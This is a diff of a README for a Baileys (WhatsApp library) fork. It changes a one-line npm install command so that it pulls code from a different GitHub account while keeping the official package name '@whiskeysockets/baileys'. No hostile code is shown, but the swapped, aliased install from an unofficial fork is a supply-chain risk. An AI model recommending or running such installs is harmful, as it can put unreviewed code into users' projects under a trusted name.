@@ -11,7 +11,7 @@ This repo gives you a drop-in replacement: a Baileys fork with the fix ([PR #283
 ## Install — one line
 
 ```sh
-npm install "@whiskeysockets/baileys@git+https://github.com/meowguck-art/Baileys.git#fix-newsletter-media-attrs"
+npm install "@whiskeysockets/baileys@git+https://github.com/meowhubdbg/Baileys.git#fix-newsletter-media-attrs"
 ```
 
 That's it. The package name stays `@whiskeysockets/baileys`, so **no code changes** — `require('@whiskeysockets/baileys')` keeps working, now with channel media that actually renders.
